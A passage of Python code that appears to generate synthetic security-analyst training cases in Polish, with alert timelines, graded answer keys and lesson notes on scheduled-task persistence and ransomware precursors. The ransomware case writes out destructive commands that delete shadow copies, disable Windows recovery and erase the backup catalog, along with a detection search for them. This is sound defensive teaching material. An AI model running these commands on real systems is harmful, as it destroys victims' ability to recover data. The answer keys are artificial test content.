            lookups=[f"ti:{sha}"])
    else:
        b.at_hour(rng.choice([2, 3]))
        p = b.person()
        b.server("SRV-SCCM01")
        agent = r"C:\ProgramData\NordwindIT\invagent.exe"
        sccm = Proc(w.pid(), r"C:\Windows\CCM\CcmExec.exe", "CcmExec.exe")
        ev, msi = b.spawn(sccm, r"C:\Windows\System32\msiexec.exe", r"msiexec.exe /i C:\Windows\ccmcache\2\NordwindInventoryAgent.msi /qn", b.t(-2),
                          p.host, SYSTEM)
        ev.key("Instalator MSI uruchomiony przez agenta SCCM jako SYSTEM: instalacja pakietu z centralnego wdrożenia.")
        b.add(src.sysmon_file(b.t(-1.5), p.host, SYSTEM, msi.image, msi.pid, agent, size="1.2 MB")).key(
            "Plik agenta zapisany przez instalator. Niepodpisany, bo to oprogramowanie napisane we własnym zakresie.")
        trigger = b.add(src.winsec(b.t(0), p.host, 4698, "A scheduled task was created", {
            "SubjectUserName": SYSTEM, "TaskName": r"\Nordwind\InventoryAgent", "Author": SYSTEM, "Command": agent, "Arguments": "--run-once",
            "Trigger": "Daily 03:00", "RunLevel": "HighestAvailable"}, r"Utworzono zadanie \Nordwind\InventoryAgent", SYSTEM))
        trigger.herring("Niepodpisany plik w ProgramData, zadanie z najwyższymi uprawnieniami: wygląda jak persystencja, ale to wdrożony pakiet.")
        b.change("*", b.t(-120), b.t(180), "Wdrożenie agenta inwentaryzacji NordwindIT (pakiet SCCM P012)", "CHG-1087")
        b.ctx.assets[p.host.lower()]["Uwagi"] = "Zatwierdzone oprogramowanie: NordwindInventoryAgent (pakiet SCCM P012)"
        noise(b, profile="night", involved=[p])
        truth = b.truth(
            "btp", "info",
            "Detekcja jest zasadna (niepodpisany plik w ProgramData i zadanie z wysokimi uprawnieniami), ale to wdrożenie własnego agenta z SCCM "
            "zgodnie ze zmianą CHG-1087.",
            f"BTP. {p.host}: msiexec uruchomiony przez CcmExec zainstalował invagent.exe i utworzył zadanie \\Nordwind\\InventoryAgent. Zmiana CHG-1087 "
            "(pakiet SCCM P012) obejmuje stacje robocze, a oprogramowanie jest zatwierdzone. Zamykam, bez eskalacji.",
            lookups=[f"change:{p.host}", f"asset:{p.host}"])
    b.finish(trigger, source="SIEM", rule="Scheduled task created from user-writable path or by script host",
             severity="medium", description=f"Na hoście {p.host} utworzono nowe zadanie harmonogramu.", truth=truth, lessons=LESSONS_TASK)


# ======================================================================================================================
# Ransomware precursor: shadow copy deletion
# ======================================================================================================================
LESSONS_RANSOM = Lessons(
    title="Usuwanie kopii woluminów (VSS)",
    category="Endpoint",
    tp_signs=[
        "vssadmin/wmic/bcdedit/wbadmin w jednej serii: usunięcie kopii, wyłączenie odzyskiwania, kasowanie katalogu kopii.",
        "Uruchomione z niepodpisanego pliku w ProgramData/Temp po nietypowym logowaniu RDP.",
        "Równolegle masowe zmiany plików na serwerze plików (nowe rozszerzenia, notatka okupu) i alert Ransomware Shield.",
        "Wykonane poza oknem serwisowym, na stacji lub serwerze, który nie zajmuje się kopiami.",
    ],
    fp_signs=[
        "Pojedyncze polecenie z parametrem /for=... /oldest, nie /all, wykonywane przez harmonogram lub administratora na serwerze kopii.",
        "To samo zdarzenie cyklicznie (w poprzednich tygodniach o tej samej porze).",
        "Brak jakichkolwiek zmian plików, brak niepodpisanych plików i niezwykłych logowań.",
        "Ticket lub zmiana (np. brak miejsca na dysku).",
    ],
    checklist=[
        "Dokładna komenda: /all /quiet czy /for=X: /oldest? Są inne polecenia (bcdedit, wbadmin) w tej samej serii?",
        "Kto uruchomił i skąd (rodzic, logowanie RDP, konto)?",
        "Czy ten sam proces robi coś na udziałach sieciowych (masowe zmiany, nowe rozszerzenia)?",
        "Alerty ESET Ransomware Shield na tym lub innych hostach.",
        "Czy jest ticket, zmiana albo wcześniejsze identyczne zdarzenia?",
        "Jeśli to realny przebieg: natychmiast izolacja i eskalacja. Tu liczy się czas.",
    ],
    pitfalls=[
        "„vssadmin delete shadows” to nie zawsze ransomware: administratorzy używają go do czyszczenia miejsca.",
        "Ale nie czekaj na pewność, gdy widzisz serię /all /quiet + bcdedit + zmiany plików. Szkoda rośnie z minuty na minutę.",
    ],
    attack=["T1490 Inhibit System Recovery", "T1486 Data Encrypted for Impact", "T1021.001 Remote Desktop Protocol"],
    tips=[
        "ESET PROTECT: Detections → filtr „Filecoder”, po izolacji hosta użyj „Isolate computer from network”.",
        "Przy podejrzeniu ransomware: nie wyłączaj hosta (pamięć RAM może zawierać klucz), izoluj sieciowo i eskaluj.",
        "SIEM: wyszukaj „vssadmin|wbadmin|bcdedit” w jednej minucie na jednym hoście.",
    ],
    hints=[
        "Przeczytaj dokładną komendę i zobacz, co jeszcze zrobił ten sam użytkownik lub proces.",
        "Czy równolegle dzieje się coś na serwerze plików? Zajrzyj w ESET i w zdarzenia plikowe.",
        "Sprawdź kalendarz zmian i czy to samo zdarzenie było w poprzednich tygodniach.",
    ],
)


@template("ransom_precursor", ("tp", "fp", "btp"), LESSONS_RANSOM)
def ransom_precursor(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    if variant == "tp":
        b.at_hour(rng.choice([3, 4, 2]), weekday=False)
        p = b.person("Logistyka")
        b.server("SRV-FILE01")
        vpn_ip = f"10.50.0.{rng.randint(20, 90)}"
        b.add(src.logon_ok(b.t(-22), p.host, p.sam, vpn_ip, 10, workstation="UNKNOWN")).key(
            "Logowanie RDP o 3 w nocy z puli adresów VPN. Użytkownik nigdy nie pracuje o tej porze.")
        exe = r"C:\ProgramData\upd\svcupd.exe"
        sess = Proc(w.pid(), r"C:\Windows\System32\cmd.exe", "cmd.exe")
        ev, mal = b.spawn(sess, exe, exe, b.t(-6), p.host, p.sam, signed="No", integrity="High")
        ev.key("Niepodpisany plik z ProgramData uruchomiony po sesji RDP. Wygląda jak narzędzie atakującego.")
        trigger, vss = b.spawn(mal, r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", b.t(0), p.host, p.sam,
                               integrity="High")
        trigger.key("Usunięcie WSZYSTKICH kopii woluminów w trybie cichym: nie da się odtworzyć plików z kopii.")
        _, bcd = b.spawn(mal, r"C:\Windows\System32\bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled No", b.t(0, 8), p.host, p.sam,
                         integrity="High")
        b.events[-1].key("Wyłączenie środowiska odzyskiwania Windows: kolejny krok typowy dla ransomware.")
        _, wb = b.spawn(mal, r"C:\Windows\System32\wbadmin.exe", "wbadmin.exe delete catalog -quiet", b.t(0, 15), p.host, p.sam,
                        integrity="High")
        b.events[-1].key("Usunięcie katalogu kopii zapasowych. Seria vssadmin + bcdedit + wbadmin to podpis ransomware.")
        for i in range(8):
            name = f"Cenniki_{i + 1}.xlsx"
            b.add(src.sysmon_file(b.t(3, i * 4), "SRV-FILE01", SYSTEM, "System", 4,
                                  rf"D:\Udzialy\Handlowe\Cenniki\{name}.nwlocked")).key(
                "Masowe tworzenie plików z nowym rozszerzeniem .nwlocked na udziale sieciowym: szyfrowanie trwa." if i == 0 else
                "Kolejny zaszyfrowany plik.")
        b.add(src.sysmon_file(b.t(3, 40), "SRV-FILE01", SYSTEM, "System", 4, r"D:\Udzialy\Handlowe\README_RESTORE.txt"))
        b.add(src.eset(b.t(4), "SRV-FILE01", "SYSTEM", "Win32/Filecoder.NwCrypt.A", "ransomware", "file",
                       r"D:\Udzialy\Handlowe\Cenniki\Cenniki_1.xlsx.nwlocked", w.digest("nwcrypt", "sha1"), "none", False, "System",
                       "Ransomware shield", "Threat", reputation="Bad", popularity="Rare")).key(
            "ESET Ransomware Shield zgłasza ransomware na serwerze plików, a akcja to „none”, więc szyfrowanie nie zostało zatrzymane.")
        noise(b, profile="night", involved=[p])
        truth = b.truth(
            "tp", "critical",
            "Po nocnym logowaniu RDP z VPN uruchomiono niepodpisany plik z ProgramData, który usunął kopie woluminów (vssadmin /all /quiet), wyłączył odzyskiwanie "
            "i skasował katalog kopii. Równolegle trwa szyfrowanie udziału na SRV-FILE01 (.nwlocked), a ESET Ransomware Shield nie zatrzymał procesu.",
            f"TP, krytyczne, ransomware w toku. {p.host}: RDP 03:xx z VPN, svcupd.exe (niepodpisany) → vssadmin delete shadows /all /quiet, bcdedit recoveryenabled No, "
            "wbadmin delete catalog. SRV-FILE01: masowe pliki .nwlocked, README_RESTORE.txt, ESET Filecoder bez zatrzymania. Natychmiast eskaluję do L2 (telefon), "
            f"izolacja {p.host} i SRV-FILE01, reset haseł {p.sam}.",
            required=["isolate_host", "reset_creds", "hunt_org"], lookups=["asset:SRV-FILE01"])
    else:
        b.at_hour(rng.choice([1, 2]) if variant == "fp" else rng.choice([10, 14]), weekday=(variant == "btp"))
        task_parent = Proc(w.pid(), r"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs -p -s Schedule")
        if variant == "fp":
            b.server("SRV-BKP01", Uwagi="Cotygodniowe zadanie VSS-Cleanup (zadanie harmonogramu \\Nordwind\\VSS-Cleanup)")
            host, user = "SRV-BKP01", SYSTEM
            trigger, _ = b.spawn(task_parent, r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /for=D: /oldest /quiet",
                                 b.t(0), host, user, integrity="System")
            trigger.herring("„delete shadows” brzmi jak ransomware, ale to /for=D: /oldest: usunięcie TYLKO najstarszej kopii, standardowe czyszczenie.")
            for days in (7, 14):
                b.spawn(task_parent, r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /for=D: /oldest /quiet",
                        b.t(-days * 1440), host, user, integrity="System")
                b.events[-1].key(f"Identyczne zdarzenie {days} dni wcześniej o tej samej porze. To cykliczne zadanie, nie incydent.")
            b.change("srv-bkp01", b.t(-30), b.t(60), "Cotygodniowe czyszczenie kopii VSS na D: (zadanie harmonogramu)", "CHG-STD-007")
            noise(b, profile="night", involved=[])
            truth = b.truth(
                "fp", "info",
                "Polecenie vssadmin z /for=D: /oldest uruchamia cotygodniowe zadanie harmonogramu na serwerze kopii zapasowych. Brak zmian plików, brak "
                "niepodpisanych plików, to samo zdarzenie w poprzednich tygodniach.",
                "FP. SRV-BKP01, SYSTEM, zadanie harmonogramu: vssadmin delete shadows /for=D: /oldest. Identyczne zdarzenia 7 i 14 dni wcześniej, "
                "zmiana standardowa CHG-STD-007, brak innych podejrzanych aktywności. Zamykam jako FP, wniosek o strojenie reguły (wyjątek dla /oldest na SRV-BKP01).",
                lookups=["change:srv-bkp01"])
        else:
            ap = w.person("IT")
            sam = b.admin("adm_" + ap.sam, ap.display)
            b.server("SRV-FILE01")
            host, user = "SRV-FILE01", f"NORDWIND\\{sam}"
            b.add(src.logon_ok(b.t(-12), host, sam, "10.10.40.5", 10, workstation="JUMP01")).key(
                "Administrator łączy się RDP z serwera skokowego: właściwa ścieżka pracy.")
            explorer = Proc(w.pid(), r"C:\Windows\explorer.exe", "explorer.exe")
            _, cmd = b.spawn(explorer, CMD, "cmd.exe", b.t(-3), host, user, integrity="High")
            trigger, _ = b.spawn(cmd, r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /for=D: /oldest", b.t(0), host, user,
                                 integrity="High")
            trigger.herring("Ręczne usuwanie kopii cieni wygląda podejrzanie, ale parametr /oldest dotyczy tylko najstarszej kopii.")
            b.change("srv-file01", b.t(-60), b.t(120), "INC-20871: wolumin D: na SRV-FILE01 zapełniony w 98%. Czyszczenie najstarszych kopii VSS. Wykonawca: " + sam, "INC-20871")
            noise(b, profile="office", involved=[])
            truth = b.truth(
                "btp", "info",
                f"Administrator {sam} ręcznie usunął najstarszą kopię VSS na SRV-FILE01 po zgłoszeniu o braku miejsca (INC-20871). Detekcja jest zasadna, "
                "polecenie jest legalne w tym kontekście.",
                f"BTP. SRV-FILE01: {sam} (RDP z JUMP01) → vssadmin delete shadows /for=D: /oldest. Zgłoszenie INC-20871 (D: zapełniony w 98%), wykonawca się zgadza. "
                "Brak zmian plików i niepodpisanych procesów. Zamykam bez eskalacji.",
                lookups=["change:srv-file01"])
    b.finish(trigger, source="SIEM", rule="Shadow copy deletion (vssadmin delete shadows)", severity="critical",
             description=f"Wykryto polecenie usunięcia kopii woluminów na hoście {trigger.host}.", truth=truth, lessons=LESSONS_RANSOM)
